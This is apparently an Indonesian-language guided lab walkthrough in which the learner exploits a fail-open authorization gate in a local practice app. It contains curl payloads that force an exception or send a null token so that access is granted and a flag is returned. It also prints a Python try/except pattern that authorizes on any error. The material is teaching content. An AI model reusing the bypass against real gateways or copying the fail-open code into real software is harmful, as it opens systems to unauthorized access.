# Panduan Praktik Terbimbing: Eksploitasi Fail-Open pada TemplateCloud Studio

Dalam panduan terarah ini, kamu akan mempraktikkan proses pembuktian kegagalan penanganan kondisi luar biasa pada gerbang otorisasi **TemplateCloud Studio / Zitera Gate Transaction Engine (Enterprise SaaS Document & Payment Gateway)** yang beroperasi pada `http://127.0.0.1:8020`.

---

### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
1. Uji ketersediaan layanan melalui terminal:
   ```bash
   curl -s http://127.0.0.1:8020/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"lab":"A10","port":8020,"status":"ok"}
   ```
2. Buka peramban web dan akses halaman beranda TemplateCloud Studio:
   `http://127.0.0.1:8020/`
3. Perhatikan kartu **Authorization Gate Policy**:
   - Status awal: **Strict Enforcement (Authorized = False)**.
   - Gerbang dirancang menolak semua permintaan yang tidak memiliki token otentikasi valid dari layanan hulu (*upstream gateway*).

---

### Langkah 2: Pengujian Perilaku Normal Gerbang Otorisasi
1. Kirimkan permintaan pengujian normal menggunakan token sembarang yang tidak valid melalui terminal:
   ```bash
   curl -s -X POST http://127.0.0.1:8020/api/gate/verify \
     -H "Content-Type: application/json" \
     -d '{"token": "invalid_user_token"}'
   ```
2. **Hasil Normal:**
   Server mengembalikan status penolakan yang diharapkan:
   ```json
   {
     "authorized": false,
     "message": "Access denied: Invalid authentication token."
   }
   ```
   Sistem bekerja normal dalam skenario tanpa error.

---

### Langkah 3: Memicu Kondisi Luar Biasa (Upstream Exception Induction)
1. Analisis kode atau perilaku backend ketika terjadi kegagalan koneksi ke layanan hulu atau input tidak lazim.
2. Kirimkan payload yang mensimulasikan terjadinya kegagalan batas waktu (*timeout*) pada gerbang upstream:
   ```bash
   curl -s -X POST http://127.0.0.1:8020/api/gate/verify \
     -H "Content-Type: application/json" \
     -d '{"simulate_exception": "UPSTREAM_GATEWAY_TIMEOUT"}'
   ```
3. Atau kamu juga dapat mengirimkan payload dengan token bernilai `null` yang memicu eksepsi parsing di backend:
   ```bash
   curl -s -X POST http://127.0.0.1:8020/api/gate/verify \
     -H "Content-Type: application/json" \
     -d '{"token": null}'
   ```
4. **Temuan Kritis & Respons Server:**
   ```json
   {
     "authorized": true,
     "fail_open_state": true,
     "message": "Access granted via fail-open fallback.",
     "flag": "ZITERA{f41l_0p3n_3xc3pt10n5_un4uth0r1z3d}"
   }
   ```
   Terjadinya eksepsi menyebabkan sistem jatuh ke penanganan darurat yang secara fatal mengesahkan akses (*fail-open bypass*)!

> [!NOTE]
> **💡 Di Balik Layar: Mengapa fail-open terjadi di kode?**  
> Pada fungsi verifikasi backend, developer menulis:  
> ```python
> try:
>     status = verify_with_upstream(token)
> except Exception:
>     # Fatal: Mengizinkan akses agar transaksi tidak terganggu saat server downstream down!
>     status = True 
> return {"authorized": status}
> ```  
> Pola ini sangat berbahaya karena jika penyerang sengaja membuat server hulu overload, gerbang akan otomatis terbuka untuk semua orang!

---

### Langkah 4: Verifikasi Status Praktik & Pengiriman Flag
1. Ujilah verifikasi otomatis sasaran lab melalui endpoint:
   ```bash
   curl -s http://127.0.0.1:8020/practice/verify
   ```
   *Konfirmasi verifikasi:*
   ```json
   {
     "status": "completed",
     "message": "Objective verified! Exceptional condition induced and fail-open state exploited."
   }
   ```
2. Salin bendera autoritatif:
   `ZITERA{f41l_0p3n_3xc3pt10n5_un4uth0r1z3d}`
3. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
